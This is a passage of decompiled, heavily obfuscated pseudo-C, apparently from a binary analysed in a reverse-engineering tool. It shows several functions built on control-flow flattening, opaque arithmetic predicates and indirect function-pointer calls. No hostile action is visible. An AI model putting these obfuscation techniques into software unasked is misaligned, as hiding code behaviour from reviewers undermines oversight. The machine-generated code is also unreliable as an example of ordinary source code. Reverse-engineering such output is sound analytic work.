                      if ((uVar4 + (uVar4 ^ DAT_00031694)) - (uVar3 & DAT_00031698) != DAT_0003169c)
                      {
                        iVar2 = -0x684e5be6;
                      }
                    }
                    if (local_98 != DAT_00031554) break;
                    iVar2 = DAT_00031560;
                    if (*local_44 != '\0') {
                      iVar2 = -0x793051de;
                    }
                  }
                  if (local_98 != DAT_0003150c) break;
                  iVar2 = DAT_00031548;
                  if (DAT_00031758 < *local_54) {
                    iVar2 = -0x7ae44341;
                  }
                }
                if (local_98 != iVar10) break;
                local_98 = DAT_00031538;
                iVar2 = local_98;
              }
              if (local_98 != DAT_0003155c) break;
              *(uint *)*local_30 = DAT_00031518 + 0x26 ^ DAT_00031518;
              local_98 = DAT_000315a0;
              iVar2 = local_98;
            }
            if (local_98 != DAT_00031560) break;
            uVar3 = (*(uint *)(DAT_000317b4 + 0x30bd0) ^ DAT_0003163c) &
                    (*(uint *)(DAT_000317b0 + 0x30bc0) ^ DAT_00031638);
            uVar3 = (uVar3 | DAT_00031640) * (uVar3 & DAT_00031640) +
                    (uVar3 & DAT_00031644) * (DAT_00031640 & ~uVar3);
            iVar7 = DAT_0003152c;
            iVar2 = DAT_00031564;
            if (DAT_00031654 < ((uVar3 | DAT_0003164c) & (uVar3 ^ DAT_00031648) | DAT_00031650)) {
              iVar2 = 0x1f17d724;
            }
          }
          if (local_98 != DAT_00031564) break;
          (*(code *)*local_2c)(local_40,uStack_3c,uStack_38,local_4c);
          local_98 = DAT_00031574;
          iVar5 = DAT_0003154c;
          iVar9 = DAT_0003156c;
          iVar10 = DAT_00031558;
          iVar2 = local_98;
        }
        if (local_98 != DAT_00031568) break;
        uVar4 = *(uint *)(DAT_00031788 + 0x31388);
        uVar6 = *(uint *)(DAT_0003178c + 0x31390);
        uVar1 = __errno();
        *local_30 = uVar1;
        uVar3 = uVar6 ^ DAT_000316d8;
        uVar4 = uVar4 ^ DAT_000316dc;
        uVar6 = uVar6 ^ DAT_000316e0;
        uVar3 = (uVar4 | uVar6) * (uVar4 & uVar6) + ~(uVar4 | uVar3) * (uVar4 & uVar3);
        uVar3 = (uVar3 - (DAT_00031524 + 2 ^ DAT_00031524) * (uVar3 & DAT_000316e4)) + DAT_000316e4;
        iVar5 = DAT_0003154c;
        iVar8 = DAT_00031550;
        iVar9 = DAT_0003156c;
        iVar2 = DAT_00031540;
        if (((uVar3 & DAT_000316e8) + (uVar3 | DAT_000316e8)) - (DAT_00031514 ^ DAT_00031514 + 1) ==
            DAT_000316ec) {
          iVar2 = 0x33594021;
        }
      }
      if (local_98 != iVar9) break;
      iVar2 = FUN_00035060((*(uint *)(DAT_00031774 + 0x312bc) ^ DAT_00031738) +
                           (*(uint *)(DAT_00031770 + 0x312b0) ^ DAT_00031734),DAT_0003173c);
      bVar11 = (iVar2 + DAT_00031740 & DAT_00031744) == DAT_00031748;
      iVar2 = DAT_00031578;
LAB_000312e8:
      iVar5 = DAT_0003154c;
      if (bVar11) {
        iVar2 = 0x45281fb0;
      }
    }
    if (local_98 != DAT_00031570) {
      if (local_98 == DAT_00031574) {
        uVar4 = *(uint *)(DAT_000317b8 + 0x30c40);
        uVar3 = *(uint *)(DAT_000317bc + 0x30c48);
        uVar1 = (*(code *)*local_2c)(local_40,uStack_3c,uStack_38,local_4c);
        *local_48 = uVar1;
        uVar3 = uVar3 ^ DAT_00031620;
        uVar4 = uVar4 ^ DAT_00031624;
        uVar3 = ((uVar4 | uVar3) & ~(uVar4 ^ uVar3)) + DAT_00031628;
        iVar5 = DAT_0003154c;
        iVar7 = DAT_0003152c;
        iVar8 = DAT_00031550;
        iVar9 = DAT_0003156c;
        iVar10 = DAT_00031558;
        iVar2 = DAT_00031574;
        if (((uVar3 ^ DAT_0003162c) & uVar3 ^ DAT_00031630) < DAT_00031634) {
          iVar2 = -0x67b3342a;
        }
      }
      else {
        if (local_98 == DAT_00031578) {
          *local_44 = *local_2c == 0;
          uVar3 = *(uint *)(DAT_0003177c + 0x310dc) ^ DAT_00031710;
          uVar3 = (uVar3 + (*(uint *)(DAT_00031778 + 0x310d0) ^ uVar3 ^ DAT_00031714)) -
                  (uVar3 & (*(uint *)(DAT_00031778 + 0x310d0) ^ DAT_0003170c));
          uVar3 = (uVar3 | DAT_00031724) * ((uVar3 | DAT_0003171c) & DAT_00031728) +
                  ((uVar3 | DAT_0003171c) & DAT_00031720) * (DAT_00031718 & ~uVar3);
          bVar11 = ((uVar3 ^ DAT_0003172c) & uVar3) == DAT_00031730;
          iVar2 = DAT_00031544;
          goto LAB_000312e8;
        }
        if (local_98 == DAT_0003157c) {
          __errno();
          local_98 = DAT_00031568;
          iVar5 = DAT_0003154c;
          iVar2 = local_98;
        }
        else if (local_98 == DAT_00031580) {
          uVar3 = FUN_00035060(*(uint *)(DAT_000317d8 + 0x30cd0) ^ DAT_000315ac,
                               *(uint *)(DAT_000317dc + 0x30cdc) ^ DAT_000315b0);
          iVar5 = DAT_0003154c;
          iVar2 = DAT_0003159c;
          if (((uVar3 & DAT_000315b4) + (DAT_0003151c + 1 ^ DAT_0003151c)) * DAT_000315b8 -
              DAT_000315bc != 0) {
            iVar2 = 0x57c076e7;
          }
        }
        else {
          iVar2 = iVar9;
          if (local_98 != DAT_00031584) {
            if (local_98 == DAT_00031588) {
              uVar3 = *(uint *)(DAT_000317c4 + 0x31160) ^ *(uint *)(DAT_000317c0 + 0x31158);
              uVar4 = uVar3 ^ DAT_00031600;
              uVar3 = (uVar4 | DAT_00031608) * (uVar4 & DAT_00031608) +
                      ((uVar3 ^ 0x434500) & DAT_00031608) * (uVar4 & DAT_00031604);
              iVar2 = iVar5;
              if ((uVar3 | DAT_0003160c) * (uVar3 & DAT_00031614) +
                  (uVar3 & DAT_00031610) * (DAT_0003160c & ~uVar3) + DAT_00031618 < DAT_0003161c) {
                iVar2 = 0x789144ad;
              }
            }
            else if (local_98 == DAT_0003158c) {
              local_98 = DAT_00031578;
              iVar2 = local_98;
            }
            else {
              iVar2 = iVar8;
              if (local_98 != DAT_00031590) {
                if (local_98 == DAT_00031594) {
                  *local_34 = 0xffffffff;
                  local_98 = DAT_00031570;
                  iVar2 = local_98;
                }
                else if (local_98 == DAT_00031598) {
                  local_98 = DAT_00031570;
                  *local_34 = *local_48;
                  iVar2 = local_98;
                }
                else if (local_98 == DAT_0003159c) {
                  local_98 = DAT_00031580;
                  iVar2 = local_98;
                }
                else if (local_98 == DAT_000315a0) {
                  uVar4 = *(uint *)(DAT_00031798 + 0x31044);
                  uVar6 = *(uint *)(DAT_0003179c + 0x3104c);
                  *(uint *)*local_30 = DAT_00031510 ^ DAT_00031510 + 0x1e;
                  iVar5 = DAT_0003154c;
                  iVar2 = DAT_00031590;
                  if (((uVar4 ^ uVar3 | uVar6 ^ DAT_000316a8) &
                       ~((uVar4 ^ DAT_000316a4) & (uVar6 ^ DAT_000316a0)) ^ DAT_000316b0 |
                      DAT_000316b4) == DAT_000316b8) {
                    iVar2 = 0x74f352af;
                  }
                }
                else {
                  iVar2 = iVar5;
                  if ((local_98 != DAT_000315a4) && (iVar2 = local_98, local_98 == DAT_000315a8)) {
                    return *local_50;
                  }
                }
              }
            }
          }
        }
      }
      goto LAB_00030a10;
    }
    *local_50 = *local_34;
    uVar4 = *(uint *)(DAT_000317d0 + 0x31318) ^ DAT_000315c0;
    uVar6 = *(uint *)(DAT_000317d4 + 0x31324) ^ DAT_000315c4;
    uVar3 = *(uint *)(DAT_000317d0 + 0x31318) ^ DAT_000315c8;
    uVar3 = FUN_00035060(((uVar6 | uVar3) * (uVar6 & uVar3) + ~(uVar6 | uVar4) * (uVar6 & uVar4) |
                         DAT_000315cc) & DAT_000315d0,DAT_000315d4);
    iVar5 = DAT_0003154c;
    iVar2 = DAT_00031580;
    if (DAT_000315d8 < uVar3) {
      iVar2 = 0x6e880323;
    }
  } while( true );
}



// ---- 000317e0  FUN_000317e0  size=940

void FUN_000317e0(void)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int local_58;
  char local_50 [8];
  int local_48 [2];
  uint local_40 [3];
  uint *local_34;
  char *local_30;
  int *local_2c;
  
  iVar1 = DAT_00031bb0;
  local_34 = local_40;
  local_2c = local_48;
  local_30 = local_50;
  uVar3 = ((*(uint *)(DAT_00031c38 + 0x31834) ^ DAT_00031b90) -
          (*(uint *)(DAT_00031c34 + 0x31824) ^ DAT_00031b8c)) * DAT_00031b94;
  uVar3 = DAT_00031b9c & ~uVar3 | uVar3 & DAT_00031b98;
  local_40[0] = (~uVar3 | DAT_00031ba4) & (uVar3 | DAT_00031ba0);
  local_58 = DAT_00031ba8;
  iVar5 = DAT_00031bc0;
  iVar6 = DAT_00031bd0;
  iVar7 = DAT_00031bbc;
  iVar8 = DAT_00031bb8;
  iVar9 = DAT_00031ba8;
  iVar10 = DAT_00031bb4;
  iVar2 = local_58;
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                do {
                  while( true ) {
                    while( true ) {
                      while( true ) {
                        while (local_58 = iVar2, local_58 == iVar1) {
                          *local_30 = *local_2c == 0;
                          iVar2 = iVar7;
                        }
                        if (local_58 != iVar10) break;
                        uVar3 = (*(uint *)(DAT_00031c48 + 0x3193c) ^ DAT_00031c00) &
                                (*(uint *)(DAT_00031c4c + 0x31948) ^ DAT_00031bfc) |
                                (*(uint *)(DAT_00031c4c + 0x31948) ^ DAT_00031bf8) &
                                (*(uint *)(DAT_00031c48 + 0x3193c) ^ DAT_00031bf4);
                        iVar5 = DAT_00031bc0;
                        iVar6 = DAT_00031bd0;
                        iVar2 = DAT_00031bd4;
                        if (DAT_00031c10 <
                            (DAT_00031c08 & ~uVar3 | uVar3 & DAT_00031c04) + DAT_00031c0c) {
                          iVar2 = 0x5c752a64;
                        }
                      }
                      if (local_58 != iVar8) break;
                      local_58 = iVar1;
                      iVar2 = local_58;
                    }
                    if (local_58 != iVar7) break;
                    iVar2 = DAT_00031bc8;
                    if (*local_30 != '\0') {
                      iVar2 = 0xd52a8d4;
                    }
                  }
                  iVar2 = iVar6;
                } while (local_58 == iVar5);
                if (local_58 != iVar9) break;
                if (*local_34 < DAT_00031c30) {
                  iVar2 = 0x1c783e5a;
                }
              }
              if (local_58 != DAT_00031bc4) break;
              local_58 = DAT_00031bd8;
              iVar2 = local_58;
            }
            if (local_58 != DAT_00031bc8) break;
            (*(code *)*local_2c)();
            local_58 = DAT_00031bb4;
            iVar5 = DAT_00031bc0;
            iVar6 = DAT_00031bd0;
            iVar7 = DAT_00031bbc;
            iVar8 = DAT_00031bb8;
            iVar9 = DAT_00031ba8;
            iVar10 = DAT_00031bb4;
            iVar2 = local_58;
          }
          if (local_58 != DAT_00031bcc) break;
          local_58 = DAT_00031bd4;
          iVar2 = local_58;
        }
        if (local_58 != iVar6) break;
        *local_2c = *(int *)(DAT_00031c3c + 0x31a1c);
        uVar3 = *(uint *)(DAT_00031c40 + 0x31a2c) ^ DAT_00031c14;
        uVar4 = *(uint *)(DAT_00031c44 + 0x31a38) ^ DAT_00031c18;
        uVar3 = FUN_00035060(uVar4 + uVar3 + (DAT_00031bac + 1 ^ DAT_00031bac) + ~(uVar3 & uVar4),
                             DAT_00031c1c);
        iVar5 = DAT_00031bc0;
        iVar6 = DAT_00031bd0;
        iVar7 = DAT_00031bbc;
        iVar8 = DAT_00031bb8;
        iVar9 = DAT_00031ba8;
        iVar10 = DAT_00031bb4;
        iVar2 = DAT_00031bd0;
        if (DAT_00031c2c <
            ((DAT_00031c20 & ~uVar3 | uVar3 & 0x16) ^ DAT_00031c24 | uVar3 & 0x10) + DAT_00031c28) {
          iVar2 = -0x36849333;
        }
      }
      if (local_58 != DAT_00031bd4) break;
      uVar3 = (*(uint *)(DAT_00031c54 + 0x31ad4) ^ DAT_00031be0) *
              (*(uint *)(DAT_00031c50 + 0x31ac8) ^ DAT_00031bdc) + DAT_00031be4;
      iVar2 = DAT_00031bd4;
      if (((uVar3 & DAT_00031be8) + (uVar3 | DAT_00031be8) & DAT_00031bec) < DAT_00031bf0) {
        iVar2 = 0x49833395;
      }
    }
    iVar2 = local_58;
  } while (local_58 != DAT_00031bd8);
  return;
}



// ---- 00031c58  FUN_00031c58  size=1652

void FUN_00031c58(void)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  undefined4 in_r3;
  int iVar6;
  uint uVar7;
  int iVar8;
  int *piVar9;
  uint uVar10;
  int iVar11;
  int iVar12;
  int local_48 [2];
  char local_40;
  int local_38 [2];
  int *local_30;
  int *local_2c;
  undefined4 uStack_28;
  
  iVar2 = DAT_00032320;
  iVar1 = DAT_000322e8;
  uStack_28 = in_r3;
  local_2c = local_38;
  local_38[0] = *(int *)(DAT_00032434 + 0x31c9c);
  local_48[0] = DAT_000322cc;
  local_30 = local_48;
  iVar6 = DAT_000322e4;
  iVar8 = DAT_000322fc;
  piVar9 = local_48;
  iVar11 = DAT_00032304;
  iVar12 = DAT_00032300;
  iVar3 = local_48[0];
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    while( true ) {
                      while( true ) {
                        while( true ) {
                          while( true ) {
                            do {
                              while( true ) {
                                while( true ) {
                                  while( true ) {
                                    while (local_48[0] = iVar3, iVar4 = *piVar9, iVar4 == iVar6) {
                                      iVar4 = FUN_00035060((*(uint *)(DAT_00032454 + 0x31ffc) ^
                                                           DAT_000323d0) -
                                                           (*(uint *)(DAT_00032450 + 0x31ff0) ^
                                                           DAT_000323cc),DAT_000323d4);
                                      iVar11 = DAT_00032304;
                                      iVar12 = DAT_00032300;
                                      iVar3 = iVar6;
                                      if (((iVar4 + DAT_000323d8) -
                                          (DAT_000322d0 ^ DAT_000322d0 + 2) *
                                          (iVar4 + DAT_000323d8 & DAT_000323dc)) + DAT_000323e0 <
                                          DAT_000323e4) {
                                        iVar3 = -0x73f629c9;
                                      }
                                    }
                                    if (iVar4 != iVar1) break;
                                    uVar10 = (*(uint *)(DAT_0003245c + 0x31dcc) ^ DAT_000323a8) &
                                             (*(uint *)(DAT_00032458 + 0x31dbc) ^ DAT_000323a4);
                                    uVar10 = (~uVar10 | DAT_000323b0) & (uVar10 | DAT_000323ac);
                                    uVar7 = ~uVar10;
                                    uVar5 = uVar7 | DAT_000323b8;
                                    iVar3 = iVar2;
                                    if ((uVar7 | DAT_000323c0) * (uVar5 & DAT_000323c4) +
                                        (uVar10 & DAT_000323b4) * (uVar5 & DAT_000323bc) ==
                                        DAT_000323c8) {
                                      iVar3 = -0x1d662213;
                                    }
                                  }
                                  if (iVar4 != DAT_000322ec) break;
                                  iVar3 = iVar1;
                                  if (local_40 != '\0') {
                                    iVar3 = -0x46b7f461;
                                  }
                                }
                                if (iVar4 != DAT_000322f0) break;
                                uVar10 = (*(uint *)(DAT_0003246c + 0x32280) ^ DAT_00032388 |
                                         *(uint *)(DAT_00032468 + 0x32270) ^ DAT_00032384) +
                                         DAT_0003238c;
                                iVar3 = DAT_00032324;
                                if ((uVar10 & DAT_00032390) * (DAT_000322e0 ^ DAT_000322e0 + 2) +
                                    (uVar10 ^ DAT_00032390) < DAT_00032394) {
                                  iVar3 = -0x24e9928b;
                                }
                              }
                              iVar3 = iVar11;
                            } while (iVar4 == DAT_000322f4);
                            if (iVar4 != DAT_000322f8) break;
                            uVar7 = *(uint *)(DAT_0003247c + 0x321d8) ^ DAT_00032350;
                            uVar10 = *(uint *)(DAT_00032478 + 0x321cc) ^ DAT_00032358;
                            uVar10 = (uVar10 | uVar7) * (uVar10 & uVar7) +
                                     (uVar10 & (*(uint *)(DAT_0003247c + 0x321d8) ^ DAT_00032354)) *
                                     (uVar7 & (*(uint *)(DAT_00032478 + 0x321cc) ^ DAT_0003234c)) +
                                     (DAT_000322dc ^ DAT_000322dc + 1) + DAT_0003235c;
                            iVar8 = DAT_000322fc;
                            iVar3 = DAT_000322fc;
                            if (((uVar10 | DAT_00032364) * (uVar10 & DAT_00032364) +
                                 (DAT_00032364 & ~uVar10) * (uVar10 & DAT_00032360) ^ DAT_00032368)
                                < DAT_0003236c) {
                              iVar3 = 0x1b75a626;
                            }
                          }
                          if (iVar4 != iVar8) break;
                          local_48[0] = DAT_00032318;
                          iVar3 = local_48[0];
                        }
                        if (iVar4 != iVar12) break;
                        uVar10 = (*(uint *)(DAT_00032474 + 0x31f8c) ^ DAT_00032374) &
                                 (*(uint *)(DAT_00032470 + 0x31f80) ^ DAT_00032370);
                        iVar3 = DAT_00032308;
                        if ((DAT_0003237c & ~uVar10 | uVar10 & DAT_00032378) == DAT_00032380) {
                          iVar3 = 0x70453532;
                        }
                      }
                      if (iVar4 != iVar11) break;
                      local_40 = *local_2c == 0;
                      uVar10 = FUN_00035060(*(uint *)(DAT_00032440 + 0x32144) ^ DAT_000323fc,
                                            *(uint *)(DAT_00032444 + 0x32150) ^ DAT_00032400);
                      uVar10 = FUN_00035060((DAT_00032408 & ~uVar10 | uVar10 & DAT_00032404) ^
                                            DAT_0003240c | uVar10 & DAT_00032410,DAT_00032414);
                      iVar11 = DAT_00032304;
                      iVar12 = DAT_00032300;
                      iVar3 = DAT_0003230c;
                      if ((uVar10 | DAT_00032418) == DAT_0003241c) {
                        iVar3 = -0x23ce8c09;
                      }
                    }
                    if (iVar4 != DAT_00032308) break;
                    local_48[0] = DAT_000322f8;
                    iVar3 = local_48[0];
                  }
                  if (iVar4 != DAT_0003230c) break;
                  local_48[0] = DAT_00032314;
                  iVar3 = local_48[0];
                }
                if (iVar4 != DAT_00032310) break;
                (*(code *)*local_2c)();
                local_48[0] = iVar2;
                iVar11 = DAT_00032304;
                iVar12 = DAT_00032300;
                iVar3 = local_48[0];
              }
              if (iVar4 != DAT_00032314) break;
              uVar10 = FUN_00035060(*(uint *)(DAT_0003244c + 0x31e8c) ^
                                    *(uint *)(DAT_00032448 + 0x31e84) ^ DAT_000323e8 | DAT_000323ec,
                                    DAT_000323f0);
              iVar11 = DAT_00032304;
              iVar12 = DAT_00032300;
              iVar3 = iVar6;
              if ((uVar10 | DAT_000323f4) < DAT_000323f8) {
                iVar3 = 0x7b57664b;
              }
            }
            if (iVar4 != DAT_00032318) break;
            uVar10 = FUN_00035060((*(uint *)(DAT_00032484 + 0x31f18) ^ DAT_00032334 |
                                  *(uint *)(DAT_00032480 + 0x31f08) ^ DAT_00032330) +
                                  (*(uint *)(DAT_00032484 + 0x31f18) ^ DAT_00032338) +
                                  (DAT_000322d8 ^ DAT_000322d8 + 1) ^ DAT_0003233c | DAT_00032340,
                                  DAT_00032344);
            iVar11 = DAT_00032304;
            iVar12 = DAT_00032300;
            iVar3 = iVar8;
            if (uVar10 < DAT_00032348) {
              iVar3 = -0x125de07d;
            }
          }
          if (iVar4 != DAT_0003231c) break;
          local_48[0] = DAT_000322f0;
          iVar3 = local_48[0];
        }
        if (iVar4 != DAT_000322cc) break;
        if ((((*(uint *)(DAT_0003243c + 0x32070) ^ DAT_00032424) &
             (*(uint *)(DAT_00032438 + 0x32064) ^ DAT_00032420)) + DAT_00032428 | DAT_0003242c) ==
            DAT_00032430) {
          iVar3 = -0x5dd29905;
        }
      }
      if (iVar4 != iVar2) break;
      uVar7 = *(uint *)(DAT_00032460 + 0x320b0);
      uVar10 = *(uint *)(DAT_00032464 + 0x320b8);
      (*(code *)*local_2c)();
      uVar10 = uVar10 ^ DAT_00032398;
      uVar7 = uVar7 ^ DAT_0003239c;
      iVar6 = DAT_000322e4;
      iVar8 = DAT_000322fc;
      piVar9 = local_30;
      iVar11 = DAT_00032304;
      iVar12 = DAT_00032300;
      iVar3 = DAT_0003231c;
      if ((uVar7 + (uVar10 - (DAT_000322d4 ^ DAT_000322d4 + 2) * (uVar10 & ~(uVar7 ^ uVar10))) &
          0x10021) == DAT_000323a0) {
        iVar3 = 0x5ccce431;
      }
    }
    iVar3 = iVar12;
  } while (((iVar4 == DAT_00032324) || (iVar3 = iVar6, iVar4 == DAT_00032328)) ||
          (iVar3 = local_48[0], iVar4 != DAT_0003232c));
  return;
}



// ---- 00032488  FUN_00032488  size=1804

uint FUN_00032488(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  int iVar8;
  int iVar9;
  uint uVar10;
  int iVar11;
  int iVar12;
  int local_80 [2];
  uint local_78 [2];
  uint local_70;
  uint local_68 [2];
  char local_60 [8];
  int local_58 [3];
  uint *local_4c;
  uint *local_48;
  char *local_44;
  undefined4 local_40;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 uStack_34;
  int *local_30;
  int *local_2c;
  
  iVar2 = DAT_00032bb8;
  iVar1 = DAT_00032b94;
  local_30 = local_58;
  local_44 = local_60;
  local_48 = local_68;
  local_4c = local_78;
  local_58[0] = *(int *)(DAT_00032d04 + 0x32500);
  local_2c = local_80;
  local_80[0] = DAT_00032b94;
  iVar6 = DAT_00032bbc;
  iVar8 = DAT_00032bc4;
  iVar9 = DAT_00032bfc;
  iVar11 = DAT_00032bd8;
  iVar12 = DAT_00032bd4;
  iVar5 = local_80[0];
  local_40 = param_1;
  uStack_3c = param_2;
  uStack_38 = param_3;
  uStack_34 = param_4;
  do {
    while( true ) {
      while( true ) {
        while( true ) {
          do {
            while( true ) {
              while( true ) {
                do {
                  while( true ) {
                    while( true ) {
                      while( true ) {
                        while( true ) {
                          while( true ) {
                            while( true ) {
                              while( true ) {
                                while( true ) {
                                  while( true ) {
                                    while( true ) {
                                      while( true ) {
                                        do {
                                          local_80[0] = iVar5;
                                          iVar3 = *local_2c;
                                          iVar5 = iVar8;
                                        } while (iVar3 == iVar2);
                                        if (iVar3 != iVar6) break;
                                        (*(code *)*local_30)(local_40,uStack_3c,uStack_38,uStack_34)
                                        ;
                                        iVar6 = DAT_00032bbc;
                                        iVar9 = DAT_00032bfc;
                                        iVar11 = DAT_00032bd8;
                                        iVar12 = DAT_00032bd4;
                                        iVar5 = DAT_00032bd8;
                                      }
                                      if (iVar3 != DAT_00032bc0) break;
                                      *local_4c = local_70;
                                      uVar4 = *(uint *)(DAT_00032d44 + 0x32748) ^ DAT_00032c20 |
                                              *(uint *)(DAT_00032d40 + 0x3273c) ^ DAT_00032c1c;
                                      if (((uVar4 | DAT_00032c24) * (uVar4 & DAT_00032c24) +
                                           (uVar4 & DAT_00032c28) * (DAT_00032c24 & ~uVar4) &
                                          DAT_00032c2c) == DAT_00032c30) {
                                        iVar5 = -0x757a0331;
                                      }
                                    }
                                    if (iVar3 != iVar8) break;
                                    uVar4 = (*(uint *)(DAT_00032d4c + 0x32b38) ^ DAT_00032c08) *
                                            (*(uint *)(DAT_00032d48 + 0x32b28) ^ DAT_00032c04) +
                                            DAT_00032c0c;
                                    if ((~((uVar4 & DAT_00032c10) *
                                           (DAT_00032ba8 + 2 ^ DAT_00032ba8) +
                                          (uVar4 ^ DAT_00032c10)) | DAT_00032c14) != DAT_00032c18) {
                                      iVar5 = -0x3d959f06;
                                    }
                                  }
                                  if (iVar3 != DAT_00032bc8) break;
                                  iVar5 = DAT_00032be8;
                                  if (*local_44 != '\0') {
                                    iVar5 = -0x5eef7f30;
                                  }
                                  local_70 = DAT_00032b98 + 0x26 ^ DAT_00032b98;
                                }
                                if (iVar3 != DAT_00032bcc) break;
                                uVar4 = *(uint *)(DAT_00032d18 + 0x32ab0) ^ DAT_00032cb8;
                                uVar7 = *(uint *)(DAT_00032d1c + 0x32ac4) ^ DAT_00032cb0;
                                iVar9 = DAT_00032bfc;
                                iVar12 = DAT_00032bd4;
                                iVar5 = DAT_00032bfc;
                                if ((((uVar4 | uVar7) * (uVar4 & uVar7) +
                                      (uVar4 & (*(uint *)(DAT_00032d1c + 0x32ac4) ^ DAT_00032cb4)) *
                                      (uVar7 & (*(uint *)(DAT_00032d18 + 0x32ab0) ^ DAT_00032cac)) |
                                     DAT_00032cbc) & DAT_00032cc0) == DAT_00032cc4) {
                                  iVar5 = 0x5091c98c;
                                }
                              }
                              if (iVar3 != DAT_00032bd0) break;
                              local_80[0] = DAT_00032bf8;
                              iVar5 = local_80[0];
                            }
                            if (iVar3 != iVar12) break;
                            local_80[0] = DAT_00032be0;
                            iVar5 = local_80[0];
                          }
                          if (iVar3 != iVar11) break;
                          uVar7 = *(uint *)(DAT_00032d28 + 0x329ac);
                          uVar10 = *(uint *)(DAT_00032d2c + 0x329b4);
                          uVar4 = (*(code *)*local_30)(local_40,uStack_3c,uStack_38,uStack_34);
                          *local_48 = uVar4;
                          uVar4 = uVar10 ^ DAT_00032c5c;
                          uVar7 = uVar7 ^ DAT_00032c60;
                          uVar10 = uVar10 ^ DAT_00032c64;
                          uVar4 = (uVar7 | uVar10) * (uVar7 & uVar10) +
                                  ~(uVar7 | uVar4) * (uVar7 & uVar4);
                          uVar4 = ((DAT_00032c6c & ~uVar4 | uVar4 & DAT_00032c68) ^ DAT_00032c70) +
                                  DAT_00032c74;
                          iVar6 = DAT_00032bbc;
                          iVar8 = DAT_00032bc4;
                          iVar9 = DAT_00032bfc;
                          iVar11 = DAT_00032bd8;
                          iVar12 = DAT_00032bd4;
                          iVar5 = DAT_00032bd0;
                          if ((uVar4 | DAT_00032c78) * (uVar4 & DAT_00032c78) +
                              (uVar4 & DAT_00032c7c) * (DAT_00032c78 & ~uVar4) < DAT_00032c80) {
                            iVar5 = -0x64614844;
                          }
                        }
                        if (iVar3 != DAT_00032bdc) break;
                        uVar4 = ((*(uint *)(DAT_00032d3c + 0x32668) ^
                                  *(uint *)(DAT_00032d38 + 0x32660) ^ DAT_00032c34) -
                                (DAT_00032bb4 ^ DAT_00032bb4 + 1)) + DAT_00032c38;
                        iVar5 = DAT_00032be4;
                        if (DAT_00032c40 < ((uVar4 ^ DAT_00032c3c) & uVar4)) {
                          iVar5 = 0x67b716fa;
                        }
                      }
                      if (iVar3 != DAT_00032be0) break;
                      *local_44 = *local_30 == 0;
                      uVar4 = FUN_00035060((*(uint *)(DAT_00032d14 + 0x326d8) ^ DAT_00032ccc) *
                                           (*(uint *)(DAT_00032d10 + 0x326cc) ^ DAT_00032cc8) +
                                           DAT_00032cd0,DAT_00032cd4);
                      iVar11 = DAT_00032bd8;
                      iVar12 = DAT_00032bd4;
                      iVar5 = DAT_00032bd4;
                      if ((DAT_00032cd8 & ~uVar4 | uVar4 & 6) != DAT_00032cdc) {
                        iVar5 = 0x49d8b876;
                      }
                    }
                    if (iVar3 != DAT_00032be4) break;
                    local_80[0] = DAT_00032bdc;
                    iVar5 = local_80[0];
                  }
                  iVar5 = iVar11;
                } while (iVar3 == DAT_00032be8);
                if (iVar3 != iVar1) break;
                uVar4 = (((*(uint *)(DAT_00032d0c + 0x328d8) ^ DAT_00032cec) &
                         (*(uint *)(DAT_00032d08 + 0x328cc) ^ DAT_00032ce8)) -
                        ((*(uint *)(DAT_00032d0c + 0x328d8) ^ DAT_00032ce4) &
                        (*(uint *)(DAT_00032d08 + 0x328cc) ^ DAT_00032ce0))) * DAT_00032cf0;
                iVar5 = DAT_00032be0;
                if (((uVar4 - (DAT_00032bac ^ DAT_00032bac + 2) * (uVar4 & DAT_00032cf4)) +
                     DAT_00032cf8 | DAT_00032cfc) == DAT_00032d00) {
                  iVar5 = -0x20232954;
                }
              }
              if (iVar3 != DAT_00032bec) break;
              local_80[0] = DAT_00032bcc;
              iVar5 = local_80[0];
            }
            iVar5 = iVar9;
          } while (iVar3 == DAT_00032bf0);
          if (iVar3 != DAT_00032bf4) break;
          local_80[0] = DAT_00032bc0;
          local_70 = *local_48;
          iVar5 = local_80[0];
        }
        if (iVar3 != DAT_00032bf8) break;
        uVar4 = (*(uint *)(DAT_00032d34 + 0x327ac) ^ DAT_00032c48 |
                *(uint *)(DAT_00032d30 + 0x3279c) ^ DAT_00032c44) +
                (*(uint *)(DAT_00032d34 + 0x327ac) ^ DAT_00032c4c) +
                (DAT_00032ba0 ^ DAT_00032ba0 + 1);
        iVar5 = DAT_00032bdc;
        if (((~uVar4 | DAT_00032c50) + uVar4 + (DAT_00032ba4 + 1 ^ DAT_00032ba4) ^ DAT_00032c54) <
            DAT_00032c58) {
          iVar5 = 0x27872739;
        }
      }
      if (iVar3 != iVar9) break;
      uVar4 = (((*(uint *)(DAT_00032d24 + 0x3282c) ^ DAT_00032c88 |
                *(uint *)(DAT_00032d20 + 0x3281c) ^ DAT_00032c84) +
               (*(uint *)(DAT_00032d24 + 0x3282c) ^ DAT_00032c8c) +
               (DAT_00032b9c ^ DAT_00032b9c + 1)) - (DAT_00032bb0 ^ DAT_00032bb0 + 1)) +
              DAT_00032c90;
      if (((DAT_00032c98 & ~uVar4 | uVar4 & DAT_00032c94) ^ DAT_00032c9c | uVar4 & DAT_00032ca0) *
          DAT_00032ca4 - DAT_00032ca8 != 0) {
        iVar5 = -0x3d08012f;
      }
    }
    iVar5 = local_80[0];
  } while (iVar3 != DAT_00032c00);
  return *local_4c;
}



// ---- 00032d50  FUN_00032d50  size=1348

void FUN_00032d50(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  char *pcVar5;
  int iVar6;
  uint uVar7;
  int local_48;
  char local_40 [8];
  code *local_38;
  char *local_30;
  undefined4 local_2c;
  undefined4 uStack_28;
  
  iVar2 = DAT_000332a0;
  iVar1 = DAT_0003329c;
  uStack_28 = param_4;
  local_2c = param_1;
  local_38 = *(code **)(DAT_000333b0 + 0x32d9c);
  local_48 = DAT_00033294;
